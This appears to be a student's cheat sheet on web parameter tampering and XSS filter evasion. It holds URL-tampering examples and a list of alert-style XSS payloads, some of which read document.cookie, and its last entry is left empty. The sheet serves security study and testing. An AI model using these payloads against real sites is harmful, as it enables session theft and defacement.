# SC MST Cheat Sheet

###### tags: #SC 

## Table of Contents
```toc
```

## Parameter Tampering
### Tampering of Form Fields
- Form field values can be tampered on Burp Suite by intercepting packets and forwarding them

### Hidden Field
- If a website uses hidden fields to store status information, malicious user can tamper with the values stored in their browser and change the referred information
- Values can be modified via by inspecting elements in the web browser

### Tampering with URL Parameters
- URLs can show parameters and values can be modified:
```
# Original
https://www.example.com/defaut.asp?profile=123&value=123

# Modified (Statuses)
https://www.example.com/defaut.asp?profile=123&value=123&status=read
https://www.example.com/defaut.asp?profile=123&value=123&status=del
```

## XSS Filter Evasion
- Basic XSS Test
```html
<script>alert("Hello World!")</script>
```

### Image XSS Using JavaScript Directive
- No quotes or semicolons
```html
<img src=javascript:alert('XSS')>
```
- HTML entities
```html
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
```
- Grave accent obfuscation
```html
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```
- Malformed `<a>` tags
```html
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
`\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`
```
- Malformed `<img>` tags
```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```
- `fromCharCode` (if no quotes of any kind are allowed, use `eval()` to create any XSS vector)
```html
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```
- Default `src` tag to get past filters that check SRC domain
```html
<IMG SRC=# onmouseover="alert('xxs')">
```
- Default `src` tag by leaving it empty
```html
<IMG SRC= onmouseover="alert('xxs')">
```
- Default `src` tag by leaving it out entirely
```html
<IMG onmouseover="alert('xxs')">
```
- On error alert
```

```